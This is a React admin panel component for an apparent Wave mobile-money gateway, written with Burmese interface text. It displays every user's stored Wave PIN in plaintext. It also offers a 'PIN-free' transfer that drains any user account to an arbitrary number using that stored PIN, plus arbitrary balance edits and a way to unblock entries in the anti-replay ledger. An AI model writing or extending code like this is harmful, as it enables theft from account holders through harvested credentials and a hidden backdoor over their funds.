import React, { useState, useEffect } from 'react';
import { RefreshCw, ArrowRightLeft, History, Zap, Check, AlertCircle } from 'lucide-react';
import { WaveAccount, Workspace, TransactionHistoryItem } from '../types';

interface AdminPanel990Props {
  onRefresh: () => void;
}

export const AdminPanel990: React.FC<AdminPanel990Props> = ({ onRefresh }) => {
  const [adminData, setAdminData] = useState<{
    overview: {
      total_balance: number;
      total_accounts: number;
      active_accounts: number;
      total_workspaces: number;
      total_transactions: number;
    };
    accounts: (WaveAccount & { workspace_name?: string })[];
    workspaces: Workspace[];
    tokens: any[];
    logs: any[];
    usedTrx: any[];
  } | null>(null);

  const [isLoading, setIsLoading] = useState(false);
  const [activeTab, setActiveTab] = useState<'all_accounts' | 'admin_transfer' | 'logs' | 'used_trx'>('all_accounts');

  // Admin Transfer state (Auto uses stored PIN!)
  const [selectedSenderPhone, setSelectedSenderPhone] = useState<string>('');
  const [adminReceiver, setAdminReceiver] = useState<string>('');
  const [adminAmount, setAdminAmount] = useState<string>('20000');
  const [adminTransferLoading, setAdminTransferLoading] = useState(false);
  const [adminTransferResult, setAdminTransferResult] = useState<string | null>(null);

  // History inspection modal
  const [historyPhone, setHistoryPhone] = useState<string | null>(null);
  const [historyItems, setHistoryItems] = useState<TransactionHistoryItem[]>([]);
  const [historyLoading, setHistoryLoading] = useState(false);

  // Balance adjustment modal
  const [adjustPhone, setAdjustPhone] = useState<string | null>(null);
  const [newBal, setNewBal] = useState('');

  const fetchAdminData = async () => {
    setIsLoading(true);
    try {
      const res = await fetch('/api/admin/overview');
      const data = await res.json();
      if (res.ok && data.status === 'success') {
        setAdminData({
          overview: data.overview,
          accounts: data.accounts,
          workspaces: data.workspaces,
          tokens: data.tokens,
          logs: data.logs,
          usedTrx: data.usedTrx,
        });
        if (!selectedSenderPhone && data.accounts.length > 0) {
          setSelectedSenderPhone(data.accounts[0].phone);
        }
      }
    } catch (err) {
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchAdminData();
    const interval = setInterval(fetchAdminData, 10000);
    return () => clearInterval(interval);
  }, []);

  // Admin Transfer execution (Auto uses user's stored PIN!)
  const handleAdminTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedSenderPhone || !adminReceiver || !adminAmount) return;

    setAdminTransferLoading(true);
    setAdminTransferResult(null);

    try {
      const res = await fetch('/api/admin/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sender_phone: selectedSenderPhone,
          receiver_phone: adminReceiver,
          amount: parseFloat(adminAmount),
        }),
      });

      const data = await res.json();
      if (res.ok && data.status === 'success') {
        setAdminTransferResult(`ငွေလွှဲအောင်မြင်ပါသည်! Trx ID: ${data.trx_id}. လက်ကျန်: ${data.sender_remaining?.toLocaleString()} Ks (Stored PIN အသုံးပြုခဲ့သည်)`);
        fetchAdminData();
        onRefresh();
      } else {
        setAdminTransferResult(`မအောင်မြင်ပါ: ${data.message}`);
      }
    } catch (err: any) {
      setAdminTransferResult(`အမှား: ${err.message}`);
    } finally {
      setAdminTransferLoading(false);
    }
  };

  const handleInspectHistory = async (phone: string) => {
    setHistoryPhone(phone);
    setHistoryLoading(true);
    try {
      const res = await fetch(`/api/admin/accounts/${phone}/history?limit=15`);
      const data = await res.json();
      if (data.status === 'success') {
        setHistoryItems(data.history || []);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setHistoryLoading(false);
    }
  };

  const handleUnblockTrx = async (trxId: string) => {
    try {
      const res = await fetch('/api/admin/unblock-trx', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ trx_id: trxId }),
      });
      if (res.ok) fetchAdminData();
    } catch (err) {
      console.error(err);
    }
  };

  const handleSaveBalance = async () => {
    if (!adjustPhone || !newBal) return;
    try {
      const res = await fetch('/api/admin/adjust-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: adjustPhone, new_balance: parseFloat(newBal) }),
      });
      if (res.ok) {
        setAdjustPhone(null);
        fetchAdminData();
        onRefresh();
      }
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="space-y-6 text-white">
      {/* Title Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-zinc-800 pb-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-white text-black font-bold">
              /admin990 Master
            </span>
            <span className="text-xs font-mono text-zinc-400">
              Admin ID: 8353748526
            </span>
          </div>
          <h1 className="text-xl sm:text-2xl font-bold tracking-tight text-white">
            Admin Master Control
          </h1>
          <p className="text-xs text-zinc-400 mt-0.5">
            User အကောင့်အားလုံးကို စစ်ဆေးခြင်း၊ PIN မလိုဘဲ တိုက်ရိုက် Transfer ပြုလုပ်ခြင်းနှင့် Gateway Logs
          </p>
        </div>

        <button
          onClick={fetchAdminData}
          className="p-2 text-zinc-400 hover:text-white bg-zinc-900 border border-zinc-700 rounded-lg cursor-pointer self-start sm:self-auto"
          title="Refresh"
        >
          <RefreshCw className={`w-3.5 h-3.5 ${isLoading ? 'animate-spin' : ''}`} />
        </button>
      </div>

      {/* KPI Cards (Monochrome) */}
      {adminData && (
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
          <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-3.5">
            <span className="text-[11px] text-zinc-500 uppercase tracking-wider block font-mono">စုစုပေါင်း လက်ကျန်ငွေ</span>
            <div className="text-lg sm:text-xl font-bold font-mono text-white tabular-nums mt-1">
              {adminData.overview.total_balance.toLocaleString()} Ks
            </div>
            <div className="text-[10px] text-zinc-400 mt-0.5 font-mono">
              {adminData.overview.total_accounts} Wave SIMs
            </div>
          </div>

          <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-3.5">
            <span className="text-[11px] text-zinc-500 uppercase tracking-wider block font-mono">Active SIMs</span>
            <div className="text-lg sm:text-xl font-bold font-mono text-white tabular-nums mt-1">
              {adminData.overview.active_accounts} / {adminData.overview.total_accounts}
            </div>
            <div className="text-[10px] text-zinc-400 mt-0.5 font-mono">
              wmt-mfs Authenticated
            </div>
          </div>

          <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-3.5">
            <span className="text-[11px] text-zinc-500 uppercase tracking-wider block font-mono">Workspaces</span>
            <div className="text-lg sm:text-xl font-bold font-mono text-white tabular-nums mt-1">
              {adminData.overview.total_workspaces}
            </div>
            <div className="text-[10px] text-zinc-400 mt-0.5 font-mono">
              User Workspaces
            </div>
          </div>

          <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-3.5">
            <span className="text-[11px] text-zinc-500 uppercase tracking-wider block font-mono">Transfer Privileges</span>
            <div className="text-lg sm:text-xl font-bold font-mono text-white tabular-nums mt-1">
              PIN-Free
            </div>
            <div className="text-[10px] text-zinc-400 mt-0.5 font-mono">
              Auto Stored PIN
            </div>
          </div>
        </div>
      )}

      {/* Tabs */}
      <div className="flex border-b border-zinc-800 gap-2 sm:gap-4 text-xs font-medium overflow-x-auto pb-1 whitespace-nowrap">
        {[
          { id: 'all_accounts', label: 'Wave အကောင့်များ (All)' },
          { id: 'admin_transfer', label: 'Admin Transfer (Pin မလို)' },
          { id: 'logs', label: 'Gateway Logs' },
          { id: 'used_trx', label: 'Used Trx Ledger' },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`pb-2.5 px-2 transition-colors cursor-pointer ${
              activeTab === tab.id
                ? 'text-white font-bold border-b-2 border-white'
                : 'text-zinc-400 hover:text-white'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* 1. All Users Wave Accounts Table */}
      {activeTab === 'all_accounts' && (
        <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-4 sm:p-5 space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-semibold text-white">
              User Wave SIM Accounts အားလုံး
            </h3>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead>
                <tr className="border-b border-zinc-800 text-zinc-400 font-medium">
                  <th className="py-2.5 px-3">Wave Phone</th>
                  <th className="py-2.5 px-3">Workspace</th>
                  <th className="py-2.5 px-3">Device / OS</th>
                  <th className="py-2.5 px-3">Stored PIN</th>
                  <th className="py-2.5 px-3 text-right">Balance</th>
                  <th className="py-2.5 px-3">Status</th>
                  <th className="py-2.5 px-3 text-right">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-800/80 font-mono text-zinc-300">
                {(adminData?.accounts || []).map((acc) => (
                  <tr key={acc.phone} className="hover:bg-zinc-900/50">
                    <td className="py-2.5 px-3">
                      <div className="font-bold text-white">0{acc.phone}</div>
                      <div className="text-[10px] text-zinc-500 font-sans">{acc.name || 'Wave SIM'}</div>
                    </td>
                    <td className="py-2.5 px-3 font-sans text-zinc-300">
                      {acc.workspace_name || 'Default Workspace'}
                    </td>
                    <td className="py-2.5 px-3 font-sans text-zinc-400">
                      <div>{acc.model}</div>
                      <span className="text-[10px] text-zinc-500 font-mono">Android {acc.os_version}</span>
                    </td>
                    <td className="py-2.5 px-3">
                      <span className="bg-black text-white px-2 py-0.5 rounded border border-zinc-800 text-[11px]">
                        {acc.pin || 'None'}
                      </span>
                    </td>
                    <td className="py-2.5 px-3 text-right font-bold text-white tabular-nums">
                      {(acc.balance || 0).toLocaleString()} Ks
                    </td>
                    <td className="py-2.5 px-3">
                      <span className={`text-[10px] font-sans px-2 py-0.5 rounded border ${acc.wmt_mfs ? 'border-zinc-700 text-white bg-zinc-900' : 'border-zinc-800 text-zinc-400 bg-black'}`}>
                        {acc.wmt_mfs ? 'Active' : 'Offline'}
                      </span>
                    </td>
                    <td className="py-2.5 px-3 text-right">
                      <div className="flex items-center justify-end gap-1.5 font-sans">
                        <button
                          onClick={() => {
                            setSelectedSenderPhone(acc.phone);
                            setActiveTab('admin_transfer');
                          }}
                          className="px-2 py-1 bg-white hover:bg-zinc-200 text-black font-semibold rounded text-[11px] cursor-pointer"
                        >
                          Transfer
                        </button>
                        <button
                          onClick={() => handleInspectHistory(acc.phone)}
                          className="p-1 text-zinc-400 hover:text-white cursor-pointer"
                          title="History"
                        >
                          <History className="w-3.5 h-3.5" />
                        </button>
                        <button
                          onClick={() => {
                            setAdjustPhone(acc.phone);
                            setNewBal(String(acc.balance || 0));
                          }}
                          className="p-1 text-zinc-400 hover:text-white cursor-pointer"
                          title="Adjust Balance"
                        >
                          <Zap className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* 2. Admin Direct Transfer (Pin မလို User pin မှတ်ထားတာ Auto သုံး) */}
      {activeTab === 'admin_transfer' && (
        <div className="max-w-md mx-auto bg-zinc-950 border border-zinc-800 rounded-xl p-5 sm:p-6 space-y-4">
          <div className="space-y-1">
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              <Zap className="w-4 h-4 text-white" />
              <span>Admin Transfer (Pin မလို Auto-PIN)</span>
            </h3>
            <p className="text-xs text-zinc-400">
              User အကောင့်မှ တိုက်ရိုက်ငွေလွှဲပါမည်။ User ၏ PIN ကို Auto ဆွဲယူသုံးစွဲပါသည်။
            </p>
          </div>

          {adminTransferResult && (
            <div className="p-3 bg-black border border-zinc-800 text-zinc-200 rounded-lg text-xs font-mono">
              {adminTransferResult}
            </div>
          )}

          <form onSubmit={handleAdminTransfer} className="space-y-3.5">
            <div>
              <label className="block text-xs font-medium text-zinc-400 mb-1">
                ငွေထုတ်ယူမည့် Wave အကောင့် ရွေးပါ
              </label>
              <select
                value={selectedSenderPhone}
                onChange={(e) => setSelectedSenderPhone(e.target.value)}
                className="w-full px-3 py-2 bg-black border border-zinc-800 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-white"
              >
                {(adminData?.accounts || []).map((a) => (
                  <option key={a.phone} value={a.phone}>
                    0{a.phone} - {(a.balance || 0).toLocaleString()} Ks [PIN: {a.pin || 'None'}]
                  </option>
                ))}
              </select>
            </div>

            <div>
              <label className="block text-xs font-medium text-zinc-400 mb-1">
                လက်ခံမည့် Wave Phone နံပါတ်
              </label>
              <input
                type="text"
                required
                value={adminReceiver}
                onChange={(e) => setAdminReceiver(e.target.value)}
                placeholder="09971234567"
                className="w-full px-3 py-2 bg-black border border-zinc-800 rounded-lg text-sm font-mono text-white focus:outline-none focus:border-white"
              />
            </div>

            <div>
              <label className="block text-xs font-medium text-zinc-400 mb-1">
                ငွေပမာဏ (Ks)
              </label>
              <input
                type="number"
                min="1000"
                step="1000"
                required
                value={adminAmount}
                onChange={(e) => setAdminAmount(e.target.value)}
                className="w-full px-3 py-2 bg-black border border-zinc-800 rounded-lg text-sm font-mono text-white focus:outline-none focus:border-white"
              />
            </div>

            <button
              type="submit"
              disabled={adminTransferLoading || !selectedSenderPhone}
              className="w-full py-2.5 bg-white hover:bg-zinc-200 text-black font-bold rounded-lg text-xs cursor-pointer flex items-center justify-center gap-1.5 transition-colors"
            >
              {adminTransferLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <ArrowRightLeft className="w-3.5 h-3.5" />}
              <span>ငွေလွှဲမည် (Pin မလို Auto-PIN)</span>
            </button>
          </form>
        </div>
      )}

      {/* 3. Live Logs */}
      {activeTab === 'logs' && (
        <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-4 sm:p-5 space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-semibold text-white">Gateway Logs (Forwarded to Bot)</h3>
            <span className="text-xs font-mono text-zinc-400">Admin ID: 8353748526</span>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs font-mono">
              <thead>
                <tr className="border-b border-zinc-800 text-zinc-400">
                  <th className="py-2.5 px-3">Time</th>
                  <th className="py-2.5 px-3">Level</th>
                  <th className="py-2.5 px-3">Event</th>
                  <th className="py-2.5 px-3">Message</th>
                  <th className="py-2.5 px-3 text-right">Bot Feed</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-800/80 text-zinc-300">
                {(adminData?.logs || []).map((l: any) => (
                  <tr key={l.id} className="hover:bg-zinc-900/50">
                    <td className="py-2 px-3 text-zinc-500 text-[11px]">
                      {new Date(l.created_at).toLocaleTimeString()}
                    </td>
                    <td className="py-2 px-3">
                      <span className="text-white font-bold">{l.level}</span>
                    </td>
                    <td className="py-2 px-3 text-zinc-300">{l.event_type}</td>
                    <td className="py-2 px-3 font-sans text-white max-w-[280px] truncate">{l.message}</td>
                    <td className="py-2 px-3 text-right text-zinc-400 font-sans">Forwarded</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* 4. Used Trx */}
      {activeTab === 'used_trx' && (
        <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-4 sm:p-5 space-y-4">
          <h3 className="text-sm font-semibold text-white">Settled Transactions Anti-Replay Ledger</h3>
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs font-mono">
              <thead>
                <tr className="border-b border-zinc-800 text-zinc-400">
                  <th className="py-2.5 px-3">Transaction ID</th>
                  <th className="py-2.5 px-3">Source</th>
                  <th className="py-2.5 px-3">Claimed Time</th>
                  <th className="py-2.5 px-3 text-right">Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-zinc-800/80 text-zinc-300">
                {(adminData?.usedTrx || []).map((u: any) => (
                  <tr key={u.trx_id} className="hover:bg-zinc-900/50">
                    <td className="py-2 px-3 text-white font-bold">{u.trx_id}</td>
                    <td className="py-2 px-3 text-zinc-400">{u.source}</td>
                    <td className="py-2 px-3 text-zinc-500">{new Date(u.used_at).toLocaleString()}</td>
                    <td className="py-2 px-3 text-right">
                      <button
                        onClick={() => handleUnblockTrx(u.trx_id)}
                        className="px-2 py-1 bg-zinc-900 hover:bg-zinc-800 text-white rounded text-[11px] font-sans cursor-pointer border border-zinc-700"
                      >
                        Unblock
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* History Inspection Modal */}
      {historyPhone && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-xs flex items-center justify-center p-4 z-50">
          <div className="bg-zinc-950 border border-zinc-700 rounded-xl p-5 max-w-md w-full space-y-3 max-h-[85vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-zinc-800 pb-3">
              <h3 className="text-sm font-bold text-white">
                Admin Wave History: 0{historyPhone}
              </h3>
              <button onClick={() => setHistoryPhone(null)} className="text-zinc-400 hover:text-white text-xs cursor-pointer">
                ✕
              </button>
            </div>

            {historyLoading ? (
              <div className="py-8 text-center text-zinc-400 text-xs">Wave transactions ရယူနေပါသည်...</div>
            ) : historyItems.length === 0 ? (
              <div className="py-8 text-center text-zinc-500 text-xs">မှတ်တမ်းမရှိပါ။</div>
            ) : (
              <div className="space-y-2 font-mono text-xs">
                {historyItems.map((h, idx) => (
                  <div key={idx} className="p-2.5 bg-black rounded-lg border border-zinc-800 flex items-center justify-between">
                    <div>
                      <div className="text-white font-bold">Trx ID: {h.transId}</div>
                      <div className="text-[11px] text-zinc-400">{h.time} · {h.title}</div>
                    </div>
                    <div className="text-right">
                      <div className="font-bold tabular-nums text-white">
                        {h.direction === 'CR' ? '+' : '-'}{h.amount.toLocaleString()} Ks
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}

            <button onClick={() => setHistoryPhone(null)} className="w-full py-2 bg-zinc-900 hover:bg-zinc-800 text-white rounded-lg text-xs font-medium cursor-pointer border border-zinc-800">
              ပိတ်မည်
            </button>
          </div>
        </div>
      )}

      {/* Adjust Balance Modal */}
      {adjustPhone && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-xs flex items-center justify-center p-4 z-50">
          <div className="bg-zinc-950 border border-zinc-700 rounded-xl p-5 max-w-sm w-full space-y-4">
            <h3 className="text-sm font-bold text-white">လက်ကျန်ငွေ ပြင်ဆင်ခြင်း: 0{adjustPhone}</h3>
            <div>
              <label className="block text-xs text-zinc-400 mb-1">New Balance (Ks)</label>
              <input
                type="number"
                value={newBal}
                onChange={(e) => setNewBal(e.target.value)}
                className="w-full px-3 py-2 bg-black border border-zinc-800 rounded-lg text-sm font-mono text-white focus:outline-none focus:border-white"
              />
            </div>
            <div className="flex gap-2">
              <button onClick={() => setAdjustPhone(null)} className="flex-1 py-2 bg-zinc-900 text-zinc-300 text-xs rounded-lg cursor-pointer border border-zinc-800">
                မလုပ်တော့ပါ
              </button>
              <button onClick={handleSaveBalance} className="flex-1 py-2 bg-white text-black text-xs font-bold rounded-lg cursor-pointer">
                သိမ်းဆည်းမည်
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
